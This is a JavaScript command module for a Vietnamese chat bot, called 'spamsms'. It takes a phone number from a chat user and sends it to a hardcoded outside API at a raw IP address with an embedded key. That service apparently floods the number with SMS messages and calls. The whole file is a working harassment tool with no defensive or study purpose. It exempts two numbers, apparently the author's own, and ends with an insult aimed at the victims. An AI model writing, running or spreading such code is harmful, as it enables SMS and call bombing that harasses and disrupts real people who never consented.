const axios = require('axios');

module.exports = {
  config: {
    name: "spamsms",
    version: "1.0.0",
    hasPermission: 0,
    credits: "L.V. Bằng",
    description: "Spam SMS + Call",
    usePrefix: true,
    usages: "",
    commandCategory: "Spam",
    cooldowns: 0,
  },

  run: async function({ args, event, api }) {
    const { sendMessage } = api;
    const { threadID: tid, messageID: mid } = event;
    const forbiddenPhone = ['0343445450', '0399526331'];
    const sdt = args[0];

    if (!sdt || sdt.length !== 10 || !sdt.startsWith('0')) {
      return sendMessage('Vui lòng nhập sdt\n📍 Ví dụ:\n🧪 Spam 0909090908', tid, mid);
    }

    if (forbiddenPhone.includes(sdt)) {
      return sendMessage('Spam con cặt!', tid, mid);
    }

    if (args.length !== 1) {
      return sendMessage('Vui lòng nhập đúng định dạng <sdt>!\nEx: 033xxxxxxx', tid, mid);
    }

    sendMessage(`Đang tiến hành spam sđt: ${sdt}`, tid, mid);
    
    const start = Date.now();
    try {
      const response = await axios.get(`http://160.191.244.101:5000/vsteam/api?key=WhawhbLdbapPG4ZJ&sdt=${sdt}`);
      const { message, phone, time } = response.data;

      sendMessage(`
        Trạng thái: Thành công!
        ──────────────────
        Thông báo: ${message}
        Số điện thoại: ${phone}
        Thời gian: ${time}
        ──────────────────
        Thời gian xử lí: ${((Date.now() - start) / 1000).toFixed(1)} giây
        ──────────────────
        FUCKYOU MẤY ĐỨA BỊ SPAM
      `, tid, mid);
    } catch (error) {
      sendMessage('Có lỗi xảy ra trong quá trình spam', tid, mid);
    }
  }
};
